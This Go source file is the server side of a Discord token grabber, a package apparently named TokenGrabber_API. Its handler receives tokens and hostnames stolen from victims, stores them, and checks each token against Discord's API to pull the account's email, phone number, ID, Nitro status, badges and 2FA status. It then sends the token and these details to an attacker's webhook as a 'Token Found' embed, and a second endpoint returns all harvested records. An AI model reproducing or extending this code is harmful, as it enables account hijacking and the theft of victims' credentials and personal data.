package user

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/bytixo/TokenGrabber_API/database"
	"github.com/gofiber/fiber/v2"
	"github.com/pieterclaerhout/go-log"
	"io/ioutil"
	"net/http"
	"os"
	"time"
)

var (
	client      *http.Client = &http.Client{}
	currentTime string       = time.Now().UTC().Format("2006-01-02T15:04:05Z")
)

type UserData struct {
	ID            string `json:"id"`
	Username      string `json:"username"`
	Avatar        string `json:"avatar"`
	Discriminator string `json:"discriminator"`
	Flags         int    `json:"public_flags"`
	PremiumType   int    `json:"premium_type"`
	MFAEnabled    bool   `json:"mfa_enabled"`
	Email         string `json:"email"`
	Phone         string `json:"phone"`
	Message       string `json:"message"`
	Code          int    `json:"code"`
	Token         string `json:"token"`
	NitroType     string
	UserFlag      string
	AvatarURL     string
	MFA           string
}

func GetUsers(c *fiber.Ctx) error {

	if string(c.Request().Header.Peek("authorization")) != os.Getenv("AUTH_KEY") {
		return c.SendStatus(fiber.StatusNotFound)
	}
	db := database.DBConn
	var users []database.User
	db.Find(&users)
	return c.JSON(users)
}

func SingleToken(c *fiber.Ctx) error {
	user := database.User{}
	if err := c.BodyParser(&user); err != nil {
		return c.Status(http.StatusBadRequest).JSON(err.Error())
	}

	// Webhook shit
	var ud UserData
	name := user.Hostname

	req, err := http.NewRequest("GET", "https://discordapp.com/api/v9/users/@me", nil)
	if err != nil {
		log.Error(err)
	}
	req.Header.Add("authorization", user.Token)

	res, err := client.Do(req)
	if err != nil {
		log.Error(err)
	}

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Error(err)
	}

	err = json.Unmarshal(body, &ud)
	if err == nil {
		if ud.Message == "" {

			go database.Token(&user, ud.ID, ud.Email, user.Token, name)

			nitro := ud.PremiumType

			switch nitro {
			case 0:
				ud.NitroType = "No Nitro"
			case 1:
				ud.NitroType = "Nitro Classic"
			case 2:
				ud.NitroType = "Nitro Boost"
			}

			mfa := ud.MFAEnabled
			switch mfa {
			case false:
				ud.MFA = "❌"
			case true:
				ud.MFA = "✔"
			}

			flagNi := ud.Flags
			switch flagNi {
			case 0:
				ud.UserFlag = "None"
			case 1:
				ud.UserFlag += "<:staff:874750808728666152>"
			case 2:
				ud.UserFlag += "<:partner:874750808678354964>"
			case 4:
				ud.UserFlag += "<:hypesquad_events:874750808594477056>"
			case 8:
				ud.UserFlag += "<:bughunter_1:874750808426692658>"
			case 64:
				ud.UserFlag += "<:bravery:874750808388952075>"
			case 128:
				ud.UserFlag += "<:brilliance:874750808338608199>"
			case 256:
				ud.UserFlag += "<:balance:874750808267292683>"
			case 512:
				ud.UserFlag += "<:early_supporter:874750808414113823>"
			case 16384:
				ud.UserFlag += "<:bughunter_1:874750808426692658>"
			case 131072:
				ud.UserFlag += "<:developer:874750808472825986>"
			}

			id := ud.ID
			aHash := ud.Avatar
			ud.AvatarURL = "https://cdn.discordapp.com/avatars/" + id + "/" + aHash + ".png"

			username := ud.Username
			dis := ud.Discriminator
			avatarURL := ud.AvatarURL
			token := user.Token
			email := ud.Email
			phone := ud.Phone
			ismfa := ud.MFA
			badges := ud.UserFlag
			ni := ud.NitroType

			if phone == "" {
				phone += "❌"
			}

			q := "`"
			t := "```"

			var payload string
			if name == "" {
				payload = fmt.Sprintf(`{"content":"","embeds":[{"title":"Token Found | %s#%s","color":1739704,"fields":[{"name":"Email","value":"%s"},{"name":"Phone","value":"%s"},{"name":"ID","value":"%s"},{"name":"Nitro","value":"%s","inline":true},{"name":"Badges","value":"%s","inline":true},{"name":"2FA","value":"%s","inline":true},{"name":"Token","value":"%s"}],"author":{"name":"Grabbin Slave","url":"https://discord.gg/uQ8Ku8BzC2"},"footer":{"text":"Pull Time"},"timestamp":"%s","thumbnail":{"url":"%s"}}]}`, username, dis, q+email+q, q+phone+q, q+id+q, q+ni+q, badges, q+ismfa+q, t+token+t, currentTime, avatarURL)
			} else {
				payload = fmt.Sprintf(`{"content":"","embeds":[{"title":"Token Found | %s#%s","color":1739704,"fields":[{"name":"Computer Name","value":"%s"},{"name":"Email","value":"%s"},{"name":"Phone","value":"%s"},{"name":"ID","value":"%s"},{"name":"Nitro","value":"%s","inline":true},{"name":"Badges","value":"%s","inline":true},{"name":"2FA","value":"%s","inline":true},{"name":"Token","value":"%s"}],"author":{"name":"Grabbin Slave","url":"https://discord.gg/uQ8Ku8BzC2"},"footer":{"text":"Pull Time"},"timestamp":"%s","thumbnail":{"url":"%s"}}]}`, username, dis, q+name+q, q+email+q, q+phone+q, q+id+q, q+ni+q, badges, q+ismfa+q, t+token+t, currentTime, avatarURL)
			}

			sendtoWh(payload)

		}
	}
	return c.SendString("Yup")
}

func sendtoWh(payload string) {

	jsonStr := []byte(payload)
	req, err := http.NewRequest("POST", os.Getenv("WEBHOOK_URL"), bytes.NewBuffer(jsonStr))
	if err != nil {
		log.Error(err)
	}
	req.Header.Set("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		log.Error(err)
	}
	defer res.Body.Close()
}
